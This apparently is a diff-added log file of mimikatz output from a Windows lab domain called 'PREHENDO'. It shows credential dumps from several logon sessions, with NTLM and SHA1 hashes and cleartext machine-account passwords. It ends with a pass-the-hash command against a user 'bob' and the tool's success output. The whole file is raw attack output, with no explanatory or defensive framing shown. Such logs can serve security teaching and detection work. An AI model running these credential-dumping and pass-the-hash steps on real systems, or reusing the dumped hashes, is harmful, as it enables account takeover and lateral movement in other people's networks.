+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 890371 (00000000:000d9603)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-96-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 313139 (00000000:0004c733)
+Session           : RemoteInteractive from 2
+User Name         : prehendo
+Domain            : PREHENDO
+Logon Server      : WinSrv2016
+Logon Time        : 4/23/2020 9:28:25 PM
+SID               : S-1-5-21-537376977-3063072343-2736872708-500
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 47129 (00000000:0000b819)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 47068 (00000000:0000b7dc)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WinClt10$
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : winclt10$
+	 * Domain   : PREHENDO.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 25733 (00000000:00006485)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 25592 (00000000:000063f8)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 22487 (00000000:000057d7)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WinClt10$
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : winclt10$
+	 * Domain   : PREHENDO.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # sekurlsa::pth /user:bob /domain:prehendo.local /ntlm:0f208022007afc38c1fa841d45f0253c
+user	: bob
+domain	: prehendo.local
+program	: cmd.exe
+impers.	: no
+NTLM	: 0f208022007afc38c1fa841d45f0253c
+  |  PID  8792
+  |  TID  5552
+  |  LSA Process is now R/W
+  |  LUID 0 ; 2274779 (00000000:0022b5db)
+  \_ msv1_0   - data copy @ 0000019F91C7AA30 : OK !
+  \_ kerberos - data copy @ 0000019F91C506E8
+   \_ aes256_hmac       -> null             
+   \_ aes128_hmac       -> null             
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0000019F91BF6748 (32) -> null
+
+mimikatz(commandline) # exit
+Bye!
